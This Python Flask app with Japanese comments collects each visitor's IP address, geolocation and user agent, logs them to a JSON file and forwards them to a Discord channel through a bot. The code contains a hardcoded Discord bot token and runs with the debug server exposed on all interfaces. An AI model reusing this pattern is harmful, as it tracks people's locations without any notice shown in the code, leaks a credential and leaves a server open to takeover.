from flask import Flask, request, render_template, jsonify
import requests
import json
import os
import threading
from discord_bot import bot

app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = "1367928958510829608"
REDIRECT_URI = "http://127.0.0.1:5000/callback"  # 必要に応じて変更してください

def get_client_ip():
    # リバースプロキシ対応の実IP取得関数
    if "X-Forwarded-For" in request.headers:
        # カンマ区切りで複数ある場合は最初が実IP
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr

def get_geo_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?lang=ja")
        data = response.json()
        return {
            "country": data.get("country", "不明"),
            "region": data.get("regionName", "不明")
        }
    except:
        return {"country": "不明", "region": "不明"}

def save_log(discord_id, data):
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}

    logs[discord_id] = data
    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

@app.route("/")
def index():
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize?"
        f"client_id={DISCORD_CLIENT_ID}&"
        f"redirect_uri={REDIRECT_URI}&"
        f"response_type=code&"
        f"scope=identify"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)

@app.route("/send_info", methods=["POST"])
def send_info():
    user_agent = request.json.get("user_agent", "不明")
    ip = get_client_ip()

    if ip == "127.0.0.1" or ip.startswith("192.") or ip.startswith("10.") or ip.startswith("172."):
        # ローカルIPの場合は外部IPを取得
        ip = requests.get("https://api.ipify.org").text

    geo = get_geo_info(ip)
    discord_id = "1366441944049258548"  # OAuth2で実装したら本物に置き換え

    user_data = {
        "ip": ip,
        "country": geo["country"],
        "region": geo["region"],
        "user_agent": user_agent
    }

    save_log(discord_id, user_data)

    bot.loop.create_task(bot.send_log(
        f"✅ 新しいアクセスログ:\n```Discord ID: {discord_id}\nIP: {ip}\n国: {geo['country']}\n地域: {geo['region']}\nUA: {user_agent}```"
    ))

    return jsonify({"status": "success"})

def run_bot():
    bot.run("MTM2NzkyODk1ODUxMDgyOTYwOA.GFpe_Y.h0mr9RdVBwU__N2NyoWu9ZW9tvSiv3ibufjvj8")

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(debug=True, host="0.0.0.0", port=5000)
